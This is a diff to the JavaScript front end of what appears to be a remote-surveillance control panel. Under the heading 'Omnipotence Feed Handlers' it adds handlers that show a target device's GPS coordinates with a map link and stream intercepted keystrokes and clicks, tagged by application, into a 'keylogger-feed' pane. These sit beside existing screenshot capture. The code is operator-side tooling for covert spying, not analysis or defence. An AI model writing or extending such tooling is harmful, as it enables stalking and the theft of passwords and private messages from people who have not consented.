@@ -111,6 +111,36 @@ socket.on('incoming_screenshot', (data) => {
     a.click();
 });
 
+// Omnipotence Feed Handlers
+socket.on('location_result', (data) => {
+    const el = document.getElementById('gps-result');
+    if (data.error) {
+        el.innerHTML = `<span style="color:red">Error: ${data.error}</span>`;
+    } else {
+        el.innerHTML = `Lat: ${data.lat.toFixed(4)}, Lon: ${data.lon.toFixed(4)}<br><a href="${data.mapUrl}" target="_blank" style="color:#0f6">Open in Google Maps</a>`;
+    }
+});
+
+socket.on('keylog_feed', (data) => {
+    const el = document.getElementById('keylogger-feed');
+    if (el.innerHTML.includes('Waiting for interception')) el.innerHTML = '';
+    
+    // Create new entry
+    const div = document.createElement('div');
+    div.style.marginBottom = '5px';
+    div.style.borderBottom = '1px dashed rgba(0,255,0,0.3)';
+    div.style.paddingBottom = '5px';
+    
+    if (data.text) {
+        div.innerHTML = `<span style="color:gray">[${new Date().toLocaleTimeString()}]</span> <span style="color:#f0f">[${data.app}]</span> Typed: <span style="color:white">${data.text}</span>`;
+    } else if (data.clicked) {
+        div.innerHTML = `<span style="color:gray">[${new Date().toLocaleTimeString()}]</span> <span style="color:#f0f">[${data.app}]</span> Clicked: <span style="color:cyan">${data.clicked}</span>`;
+    }
+    
+    el.appendChild(div);
+    el.scrollTop = el.scrollHeight; // Auto-scroll
+});
+
 // Chat Logic
 function sendChatMessage() {
     const input = document.getElementById('chat-input');
